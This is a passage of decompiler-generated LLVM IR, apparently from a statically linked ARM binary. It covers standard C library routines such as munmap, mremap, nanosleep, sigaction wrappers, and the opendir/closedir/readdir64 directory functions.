  br i1 %v1_18b60, label %dec_label_pc_18b68, label %dec_label_pc_18b54.dec_label_pc_18b6c_crit_edge

dec_label_pc_18b54.dec_label_pc_18b6c_crit_edge:  ; preds = %dec_label_pc_18b54
  %v0_18b6c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18b6c

dec_label_pc_18b68:                               ; preds = %dec_label_pc_18b54, %dec_label_pc_18b34
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18b6c

dec_label_pc_18b6c:                               ; preds = %dec_label_pc_18b44, %dec_label_pc_18b54.dec_label_pc_18b6c_crit_edge, %dec_label_pc_18b68
  %v0_18b6c = phi i32 [ %v0_18b6c.pre, %dec_label_pc_18b54.dec_label_pc_18b6c_crit_edge ], [ -1, %dec_label_pc_18b68 ], [ %v4_18b44, %dec_label_pc_18b44 ]
  %v2_18b70 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18b70, i32* @r4, align 4
  ret i32 %v0_18b6c

; uselistorder directives
  uselistorder i32 %v4_18b44, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_18b6c, { 2, 1, 0 }
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %v1_18b90 = load i32, i32* @r0, align 4
  ret i32 %v1_18b90
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_18b94 = load i32, i32* @r7, align 4
  store i32 %v3_18b94, i32* %stack_var_-8, align 4
  %v0_18ba0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_18ba0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_18ba0, -4095
  br i1 %tmp, label %dec_label_pc_18bc0, label %dec_label_pc_18bb0

dec_label_pc_18bb0:                               ; preds = %entry
  %v0_18bb0 = call i32 @__GI___errno_location()
  %v0_18bb4 = load i32, i32* %r7.global-to-local, align 4
  %v1_18bb4 = sub i32 0, %v0_18bb4
  %v2_18bb8 = inttoptr i32 %v0_18bb0 to i32*
  store i32 %v1_18bb4, i32* %v2_18bb8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_18bc0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_18bc0

dec_label_pc_18bc0:                               ; preds = %entry, %dec_label_pc_18bb0
  %v1_18bc4 = phi i32 [ %v0_18ba0, %entry ], [ -1, %dec_label_pc_18bb0 ]
  %v2_18bc0 = phi i32 [ %v3_18b94, %entry ], [ %v2_18bc0.pre, %dec_label_pc_18bb0 ]
  store i32 %v2_18bc0, i32* @r7, align 4
  ret i32 %v1_18bc4

; uselistorder directives
  uselistorder i32 %v0_18ba0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18bc0, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_18bc8 = load i32, i32* @r7, align 4
  store i32 %v3_18bc8, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_18bf0, label %dec_label_pc_18be0

dec_label_pc_18be0:                               ; preds = %entry
  %v0_18be0 = call i32 @__GI___errno_location()
  %v0_18be4 = load i32, i32* %r7.global-to-local, align 4
  %v1_18be4 = sub i32 0, %v0_18be4
  %v2_18be8 = inttoptr i32 %v0_18be0 to i32*
  store i32 %v1_18be4, i32* %v2_18be8, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_18bf4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_18bf0

dec_label_pc_18bf0:                               ; preds = %entry, %dec_label_pc_18be0
  %v2_18bf4 = phi i32 [ %v3_18bc8, %entry ], [ %v2_18bf4.pre, %dec_label_pc_18be0 ]
  %v0_18bf0 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_18be0 ]
  store i32 %v2_18bf4, i32* @r7, align 4
  ret i32 %v0_18bf0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18bf0, { 1, 0 }
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_18c30, label %dec_label_pc_18c20

dec_label_pc_18c20:                               ; preds = %entry
  %v0_18c20 = call i32 @__GI___errno_location()
  %v0_18c24 = load i32, i32* %r4.global-to-local, align 4
  %v1_18c24 = sub i32 0, %v0_18c24
  %v2_18c28 = inttoptr i32 %v0_18c20 to i32*
  store i32 %v1_18c24, i32* %v2_18c28, align 4
  br label %dec_label_pc_18c30

dec_label_pc_18c30:                               ; preds = %entry, %dec_label_pc_18c20
  %v1_18c38 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_18c20 ]
  ret i32 %v1_18c38

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18c30, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_18c3c = load i32, i32* @r7, align 4
  store i32 %v3_18c3c, i32* %stack_var_-8, align 4
  %v0_18c48 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_18c48, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_18c48, -4095
  br i1 %tmp, label %dec_label_pc_18c68, label %dec_label_pc_18c58

dec_label_pc_18c58:                               ; preds = %entry
  %v0_18c58 = call i32 @__GI___errno_location()
  %v0_18c5c = load i32, i32* %r7.global-to-local, align 4
  %v1_18c5c = sub i32 0, %v0_18c5c
  %v2_18c60 = inttoptr i32 %v0_18c58 to i32*
  store i32 %v1_18c5c, i32* %v2_18c60, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_18c68.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_18c68

dec_label_pc_18c68:                               ; preds = %entry, %dec_label_pc_18c58
  %v1_18c6c = phi i32 [ %v0_18c48, %entry ], [ -1, %dec_label_pc_18c58 ]
  %v2_18c68 = phi i32 [ %v3_18c3c, %entry ], [ %v2_18c68.pre, %dec_label_pc_18c58 ]
  store i32 %v2_18c68, i32* @r7, align 4
  ret i32 %v1_18c6c

; uselistorder directives
  uselistorder i32 %v0_18c48, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18c68, { 1, 0 }
}

define i32 @__GI_closedir(i32* %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_18c70 = load i32, i32* @r4, align 4
  store i32 %v3_18c70, i32* %stack_var_-24, align 4
  %v2_18c74 = load i32, i32* %arg1, align 4
  store i32 %v2_18c74, i32* %r4.global-to-local, align 4
  %v3_18c7c = icmp eq i32 %v2_18c74, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* @r6, align 4
  br i1 %v3_18c7c, label %dec_label_pc_18c90, label %dec_label_pc_18ca4

dec_label_pc_18c90:                               ; preds = %entry
  %v0_18c90 = call i32 @__GI___errno_location()
  store i32 9, i32* %r3.global-to-local, align 4
  %v0_18c98 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_18c98, i32* %r2.global-to-local, align 4
  %v2_18c9c = inttoptr i32 %v0_18c90 to i32*
  store i32 9, i32* %v2_18c9c, align 4
  %v0_18d44.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18d44

dec_label_pc_18ca4:                               ; preds = %entry
  store i32 36, i32* %r3.global-to-local, align 4
  %v1_18ca8 = add i32 %tmp, 24
  store i32 %v1_18ca8, i32* %r4.global-to-local, align 4
  store i32 %v1_18ca8, i32* %r2.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_18cbc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_18cbc)
  store i32 -1, i32* @r8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_18cd4 = load i32, i32* @r6, align 4
  %v2_18cd4 = add i32 %v0_18cd4, 16
  %v3_18cd4 = inttoptr i32 %v2_18cd4 to i32*
  %v4_18cd4 = load i32, i32* %v3_18cd4, align 4
  call void @__pseudo_branch(i32 %v4_18cd4)
  %v0_18ce0 = load i32, i32* @r7, align 4
  %v1_18ce0 = inttoptr i32 %v0_18ce0 to i32*
  %v2_18ce0 = load i32, i32* %v1_18ce0, align 4
  store i32 %v2_18ce0, i32* @r4, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_18cf0 = load i32, i32* @r8, align 4
  store i32 %v0_18cf0, i32* %v1_18ce0, align 4
  %v0_18cf4 = load i32, i32* @r6, align 4
  %v1_18cf4 = load i32, i32* %r3.global-to-local, align 4
  %v2_18cf4 = add i32 %v1_18cf4, %v0_18cf4
  %v3_18cf4 = inttoptr i32 %v2_18cf4 to i32*
  %v4_18cf4 = load i32, i32* %v3_18cf4, align 4
  store i32 ptrtoint (i32* @global_var_18d00.1122 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_18cf4)
  %v0_18d00 = load i32, i32* @r7, align 4
  %v1_18d00 = add i32 %v0_18d00, 12
  %v2_18d00 = inttoptr i32 %v1_18d00 to i32*
  %v3_18d00 = load i32, i32* %v2_18d00, align 4
  store i32 %v3_18d00, i32* @r0, align 4
  %v0_18d04 = call i32 @free()
  %v0_18d08 = load i32, i32* @r7, align 4
  store i32 %v0_18d08, i32* @r0, align 4
  %v0_18d0c = call i32 @free()
  %v0_18d14 = load i32, i32* @r4, align 4
  %tmp11 = icmp ult i32 %v0_18d14, -4095
  br i1 %tmp11, label %dec_label_pc_18d40, label %dec_label_pc_18d30

dec_label_pc_18d30:                               ; preds = %dec_label_pc_18ca4
  %v0_18d30 = call i32 @__GI___errno_location()
  %v0_18d34 = load i32, i32* @r4, align 4
  %v1_18d34 = sub i32 0, %v0_18d34
  store i32 %v1_18d34, i32* %r3.global-to-local, align 4
  %v2_18d38 = inttoptr i32 %v0_18d30 to i32*
  store i32 %v1_18d34, i32* %v2_18d38, align 4
  %v0_18d3c = load i32, i32* @r8, align 4
  br label %dec_label_pc_18d40

dec_label_pc_18d40:                               ; preds = %dec_label_pc_18ca4, %dec_label_pc_18d30
  %v0_18d40 = phi i32 [ %v0_18d14, %dec_label_pc_18ca4 ], [ %v0_18d3c, %dec_label_pc_18d30 ]
  store i32 %v0_18d40, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18d44

dec_label_pc_18d44:                               ; preds = %dec_label_pc_18c90, %dec_label_pc_18d40
  %v0_18d44 = phi i32 [ %v0_18d44.pre, %dec_label_pc_18c90 ], [ %v0_18d40, %dec_label_pc_18d40 ]
  %v2_18d4c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_18d4c, i32* %r4.global-to-local, align 4
  ret i32 %v0_18d44

; uselistorder directives
  uselistorder i32 %v0_18d14, { 1, 0 }
  uselistorder label %dec_label_pc_18d44, { 1, 0 }
  uselistorder label %dec_label_pc_18d40, { 1, 0 }
}

define i32 @function_18d58(i32 %arg1) local_unnamed_addr {
dec_label_pc_18d58:
  %v0_18d58 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18d58, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_18d58
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_18d58, %bb
  %v10_18d64 = phi i32 [ %arg1, %dec_label_pc_18d58 ], [ 0, %bb ]
  ret i32 %v10_18d64

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @fd_to_DIR(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v12_18d68 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  %v1_18d7c = call i32 @malloc(i32 48)
  %v2_18d84 = icmp eq i32 %v1_18d7c, 0
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* @r6, align 4
  br i1 %v2_18d84, label %bb, label %dec_label_pc_18d94

bb:                                               ; preds = %entry
  br label %dec_label_pc_18e20

dec_label_pc_18d94:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_18d98 = load i32, i32* @r4, align 4
  %v2_18d98 = icmp ugt i32 %v0_18d98, 511
  %v2_18d9c = add i32 %v1_18d7c, 4
  %v3_18d9c = inttoptr i32 %v2_18d9c to i32*
  store i32 0, i32* %v3_18d9c, align 4
  %v0_18da0 = load i32, i32* %r3.global-to-local, align 4
  %v2_18da0 = add i32 %v1_18d7c, 16
  %v3_18da0 = inttoptr i32 %v2_18da0 to i32*
  store i32 %v0_18da0, i32* %v3_18da0, align 4
  %v0_18da4 = load i32, i32* %r3.global-to-local, align 4
  %v2_18da4 = add i32 %v1_18d7c, 8
  %v3_18da4 = inttoptr i32 %v2_18da4 to i32*
  store i32 %v0_18da4, i32* %v3_18da4, align 4
  br i1 %v2_18d98, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_18d94
  %v0_18dac2 = load i32, i32* @r4, align 4
  %v2_18dac3 = add i32 %v1_18d7c, 20
  %v3_18dac4 = inttoptr i32 %v2_18dac3 to i32*
  store i32 %v0_18dac2, i32* %v3_18dac4, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_18d94
  %v1_18da8 = load i32, i32* %r3.global-to-local, align 4
  %v2_18da8 = add i32 %v1_18da8, 512
  store i32 %v2_18da8, i32* %r3.global-to-local, align 4
  %v0_18dac = load i32, i32* @r4, align 4
  %v2_18dac = add i32 %v1_18d7c, 20
  %v3_18dac = inttoptr i32 %v2_18dac to i32*
  store i32 %v0_18dac, i32* %v3_18dac, align 4
  %v1_18db0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_18db0, i32* %v3_18dac, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v1_18d7c, i32* @r5, align 4
  %v0_18db8 = load i32, i32* @r7, align 4
  %v2_18db8 = inttoptr i32 %v1_18d7c to i32*
  store i32 %v0_18db8, i32* %v2_18db8, align 4
  %v0_18dbc = load i32, i32* @r5, align 4
  %v1_18dbc = add i32 %v0_18dbc, 20
  %v2_18dbc = inttoptr i32 %v1_18dbc to i32*
  %v3_18dbc = load i32, i32* %v2_18dbc, align 4
  store i32 %v3_18dbc, i32* %r1.global-to-local, align 4
  %v2_18dc4 = call i32 @calloc(i32 1, i32 %v3_18dbc)
  %v2_18dc8 = icmp eq i32 %v2_18dc4, 0
  store i32 %v2_18dc4, i32* @r4, align 4
  %v1_18dd0 = load i32, i32* @r5, align 4
  %v2_18dd0 = add i32 %v1_18dd0, 12
  %v3_18dd0 = inttoptr i32 %v2_18dd0 to i32*
  store i32 %v2_18dc4, i32* %v3_18dd0, align 4
  br i1 %v2_18dc8, label %dec_label_pc_18dd8, label %dec_label_pc_18de8

dec_label_pc_18dd8:                               ; preds = %bb17
  %v0_18dd8 = load i32, i32* @r5, align 4
  store i32 %v0_18dd8, i32* @r0, align 4
  %v0_18ddc = call i32 @free()
  %v0_18de0 = load i32, i32* @r4, align 4
  br label %dec_label_pc_18e20

dec_label_pc_18de8:                               ; preds = %bb17
  %v0_18dec = load i32, i32* @r6, align 4
  %v2_18dec = add i32 %v0_18dec, -34484
  store i32 %v2_18dec, i32* %r3.global-to-local, align 4
  %v1_18df4 = inttoptr i32 %v2_18dec to i32*
  %v2_18df4 = load i32, i32* %v1_18df4, align 4
  %v3_18df4 = add i32 %v0_18dec, -34480
  %v4_18df4 = inttoptr i32 %v3_18df4 to i32*
  %v5_18df4 = load i32, i32* %v4_18df4, align 4
  store i32 %v5_18df4, i32* %r1.global-to-local, align 4
  %v6_18df4 = add i32 %v0_18dec, -34476
  %v7_18df4 = inttoptr i32 %v6_18df4 to i32*
  %v8_18df4 = load i32, i32* %v7_18df4, align 4
  store i32 %v8_18df4, i32* %r2.global-to-local, align 4
  %v9_18df4 = add i32 %v0_18dec, -34472
  %v10_18df4 = inttoptr i32 %v9_18df4 to i32*
  %v11_18df4 = load i32, i32* %v10_18df4, align 4
  store i32 %v11_18df4, i32* %r3.global-to-local, align 4
  %v12_18df4 = add i32 %v0_18dec, -34468
  %v1_18e00 = inttoptr i32 %v12_18df4 to i32*
  %v2_18e00 = load i32, i32* %v1_18e00, align 4
  %v3_18e00 = add i32 %v0_18dec, -34464
  %v4_18e00 = inttoptr i32 %v3_18e00 to i32*
  %v5_18e00 = load i32, i32* %v4_18e00, align 4
  store i32 %v2_18e00, i32* %stack_var_-32, align 4
  store i32 %v5_18df4, i32* %r1.global-to-local, align 4
  store i32 %v8_18df4, i32* %r2.global-to-local, align 4
  store i32 %v11_18df4, i32* %r3.global-to-local, align 4
  %v0_18e10 = load i32, i32* @r5, align 4
  %v1_18e10 = add i32 %v0_18e10, 24
  %v1_18e14 = inttoptr i32 %v1_18e10 to i32*
  store i32 %v2_18df4, i32* %v1_18e14, align 4
  %v3_18e14 = add i32 %v0_18e10, 28
  %v4_18e14 = inttoptr i32 %v3_18e14 to i32*
  %v5_18e14 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_18e14, i32* %v4_18e14, align 4
  %v6_18e14 = add i32 %v0_18e10, 32
  %v7_18e14 = inttoptr i32 %v6_18e14 to i32*
  %v8_18e14 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_18e14, i32* %v7_18e14, align 4
  %v9_18e14 = add i32 %v0_18e10, 36
  %v10_18e14 = inttoptr i32 %v9_18e14 to i32*
  %v11_18e14 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_18e14, i32* %v10_18e14, align 4
  %v12_18e14 = add i32 %v0_18e10, 40
  %v2_18e18 = load i32, i32* %stack_var_-32, align 4
  store i32 %v5_18e00, i32* %r1.global-to-local, align 4
  %v1_18e1c = inttoptr i32 %v12_18e14 to i32*
  store i32 %v2_18e18, i32* %v1_18e1c, align 4
  %v3_18e1c = add i32 %v0_18e10, 44
  %v4_18e1c = inttoptr i32 %v3_18e1c to i32*
  %v5_18e1c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_18e1c, i32* %v4_18e1c, align 4
  %v0_18e20.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18e20

dec_label_pc_18e20:                               ; preds = %bb, %dec_label_pc_18dd8, %dec_label_pc_18de8
  %v0_18e20 = phi i32 [ 0, %bb ], [ %v0_18de0, %dec_label_pc_18dd8 ], [ %v0_18e20.pre, %dec_label_pc_18de8 ]
  store i32 %v12_18d68, i32* @r7, align 4
  ret i32 %v0_18e20

; uselistorder directives
  uselistorder i32 %v2_18dc4, { 1, 0, 2 }
  uselistorder i32 %v1_18d7c, { 4, 3, 6, 0, 5, 2, 1, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_18e20, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_opendir(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_18e40 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %arg1, i32* @r7, align 4
  %tmp7 = icmp ult i32 %arg1, -4095
  br i1 %tmp7, label %dec_label_pc_18e68, label %dec_label_pc_18e58

dec_label_pc_18e58:                               ; preds = %entry
  %v0_18e58 = call i32 @__GI___errno_location()
  %v0_18e5c = load i32, i32* @r7, align 4
  %v1_18e5c = sub i32 0, %v0_18e5c
  %v2_18e60 = inttoptr i32 %v0_18e58 to i32*
  store i32 %v1_18e5c, i32* %v2_18e60, align 4
  br label %dec_label_pc_18e8c

dec_label_pc_18e68:                               ; preds = %entry
  %v1_18e68 = icmp slt i32 %arg1, 0
  br i1 %v1_18e68, label %dec_label_pc_18e8c, label %dec_label_pc_18e70

dec_label_pc_18e70:                               ; preds = %dec_label_pc_18e68
  store i32 %v2_18e40, i32* @r1, align 4
  %v0_18e74 = call i32 @fstat()
  %v1_18e78 = icmp slt i32 %v0_18e74, 0
  br i1 %v1_18e78, label %dec_label_pc_18e80, label %dec_label_pc_18e94

dec_label_pc_18e80:                               ; preds = %dec_label_pc_18e70
  br label %dec_label_pc_18e8c

dec_label_pc_18e8c:                               ; preds = %dec_label_pc_18e80, %dec_label_pc_18e68, %dec_label_pc_18e58
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18ed0

dec_label_pc_18e94:                               ; preds = %dec_label_pc_18e70
  %v0_18e9c = load i32, i32* @r7, align 4
  %v3_18ea0 = call i32 @__GI___fcntl_nocancel(i32 %v0_18e9c, i32 2, i32 1)
  %v0_18ea4 = load i32, i32* @r7, align 4
  %v2_18eac = call i32 @fd_to_DIR(i32 %v0_18ea4, i32 %tmp)
  store i32 %v2_18eac, i32* %r4.global-to-local, align 4
  %v2_18eb0 = icmp eq i32 %v2_18eac, 0
  br i1 %v2_18eb0, label %dec_label_pc_18eb8, label %dec_label_pc_18ed0

dec_label_pc_18eb8:                               ; preds = %dec_label_pc_18e94
  %v0_18ec4 = call i32 @__GI___errno_location()
  %v2_18ecc = inttoptr i32 %v0_18ec4 to i32*
  store i32 12, i32* %v2_18ecc, align 4
  %v0_18ed0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18ed0

dec_label_pc_18ed0:                               ; preds = %dec_label_pc_18e94, %dec_label_pc_18e8c, %dec_label_pc_18eb8
  %v0_18ed0 = phi i32 [ %v2_18eac, %dec_label_pc_18e94 ], [ 0, %dec_label_pc_18e8c ], [ %v0_18ed0.pre, %dec_label_pc_18eb8 ]
  ret i32 %v0_18ed0

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_18ed0, { 2, 0, 1 }
}

define i32 @fdopendir(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_18ee8 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_18ee8, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_18ef4 = call i32 @fstat()
  store i32 %v0_18ef4, i32* @r5, align 4
  %v2_18ef8 = icmp eq i32 %v0_18ef4, 0
  br i1 %v2_18ef8, label %dec_label_pc_18f00, label %dec_label_pc_18f68

dec_label_pc_18f00:                               ; preds = %entry
  %v1_18f04 = and i32 %tmp4, ptrtoint (i32* @global_var_f000.1126 to i32)
  store i32 %v1_18f04, i32* @r3, align 4
  %v7_18f08 = icmp eq i32 %v1_18f04, 16384
  br i1 %v7_18f08, label %dec_label_pc_18f20, label %dec_label_pc_18f10

dec_label_pc_18f10:                               ; preds = %dec_label_pc_18f00
  %v0_18f10 = call i32 @__GI___errno_location()
  br label %dec_label_pc_18f4c

dec_label_pc_18f20:                               ; preds = %dec_label_pc_18f00
  %v0_18f20 = load i32, i32* @r4, align 4
  %v2_18f28 = call i32 @__libc_fcntl(i32 %v0_18f20, i32 3)
  %v7_18f2c = icmp eq i32 %v2_18f28, -1
  br i1 %v7_18f2c, label %dec_label_pc_18f68, label %dec_label_pc_18f34

dec_label_pc_18f34:                               ; preds = %dec_label_pc_18f20
  %v1_18f34 = urem i32 %v2_18f28, 4
  %v7_18f38 = icmp eq i32 %v1_18f34, 1
  br i1 %v7_18f38, label %dec_label_pc_18f40, label %dec_label_pc_18f54

dec_label_pc_18f40:                               ; preds = %dec_label_pc_18f34
  %v0_18f40 = call i32 @__GI___errno_location()
  br label %dec_label_pc_18f4c

dec_label_pc_18f4c:                               ; preds = %dec_label_pc_18f10, %dec_label_pc_18f40
  %storemerge2 = phi i32 [ %v0_18f10, %dec_label_pc_18f10 ], [ %v0_18f40, %dec_label_pc_18f40 ]
  %storemerge = phi i32 [ 20, %dec_label_pc_18f10 ], [ 22, %dec_label_pc_18f40 ]
  %storemerge1 = load i32, i32* @r5, align 4
  store i32 %storemerge1, i32* %r2.global-to-local, align 4
  %v2_18f4c = inttoptr i32 %storemerge2 to i32*
  store i32 %storemerge, i32* %v2_18f4c, align 4
  %v0_18f6c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18f6c

dec_label_pc_18f54:                               ; preds = %dec_label_pc_18f34
  %v0_18f54 = load i32, i32* @r4, align 4
  %v2_18f5c = call i32 @fd_to_DIR(i32 %v0_18f54, i32 %tmp)
  store i32 %v2_18f5c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18f6c

dec_label_pc_18f68:                               ; preds = %entry, %dec_label_pc_18f20
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18f6c

dec_label_pc_18f6c:                               ; preds = %dec_label_pc_18f54, %dec_label_pc_18f4c, %dec_label_pc_18f68
  %v0_18f6c = phi i32 [ %v2_18f5c, %dec_label_pc_18f54 ], [ %v0_18f6c.pre, %dec_label_pc_18f4c ], [ 0, %dec_label_pc_18f68 ]
  ret i32 %v0_18f6c

; uselistorder directives
  uselistorder i32 %v2_18f28, { 1, 0 }
  uselistorder i32 (i32, i32)* @fd_to_DIR, { 1, 0 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 6, 0, 5, 10, 9, 8, 7, 4, 3, 2, 1 }
  uselistorder i32 16384, { 12, 0, 13, 5, 6, 7, 3, 4, 1, 2, 8, 9, 10, 11 }
  uselistorder i32 ()* @fstat, { 1, 0 }
  uselistorder label %dec_label_pc_18f6c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18f68, { 1, 0 }
  uselistorder label %dec_label_pc_18f4c, { 1, 0 }
}

define i32 @readdir64(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* @r6, align 4
  %v1_18f90 = add i32 %tmp, 24
  store i32 %v1_18f90, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_18fa8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 76) to i32*), align 4
  store i32 %v4_18fa8, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_18fa8)
  %v0_18fbc = load i32, i32* @r6, align 4
  %v2_18fbc = add i32 %v0_18fbc, 16
  %v3_18fbc = inttoptr i32 %v2_18fbc to i32*
  %v4_18fbc = load i32, i32* %v3_18fbc, align 4
  store i32 %v4_18fbc, i32* %ip.global-to-local, align 4
  store i32 102344, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_18fbc)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_18fcc

dec_label_pc_18fcc:                               ; preds = %dec_label_pc_18ffc, %entry
  %v0_18fcc = load i32, i32* @r5, align 4
  %v1_18fcc = add i32 %v0_18fcc, 4
  %v2_18fcc = inttoptr i32 %v1_18fcc to i32*
  %v3_18fcc = load i32, i32* %v2_18fcc, align 4
  %v4_18fcc = add i32 %v0_18fcc, 8
  %v5_18fcc = inttoptr i32 %v4_18fcc to i32*
  %v6_18fcc = load i32, i32* %v5_18fcc, align 4
  %tmp10 = icmp ugt i32 %v6_18fcc, %v3_18fcc
  br i1 %tmp10, label %dec_label_pc_18ffc, label %dec_label_pc_18fd8

dec_label_pc_18fd8:                               ; preds = %dec_label_pc_18fcc
  %v1_18fd8 = inttoptr i32 %v0_18fcc to i32*
  %v2_18fd8 = load i32, i32* %v1_18fd8, align 4
  %v1_18fdc = add i32 %v0_18fcc, 12
  %v2_18fdc = inttoptr i32 %v1_18fdc to i32*
  %v3_18fdc = load i32, i32* %v2_18fdc, align 4
  %v1_18fe0 = add i32 %v0_18fcc, 20
  %v2_18fe0 = inttoptr i32 %v1_18fe0 to i32*
  %v3_18fe0 = load i32, i32* %v2_18fe0, align 4
  %v4_18fe4 = inttoptr i32 %v3_18fdc to i32*
  %v5_18fe4 = call i32 @__getdents64(i32 %v2_18fd8, i32* %v4_18fe4, i32 %v3_18fe0, i32 %v6_18fcc)
  %tmp9 = icmp slt i32 %v5_18fe4, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_18ff4

.thread:                                          ; preds = %dec_label_pc_18fd8
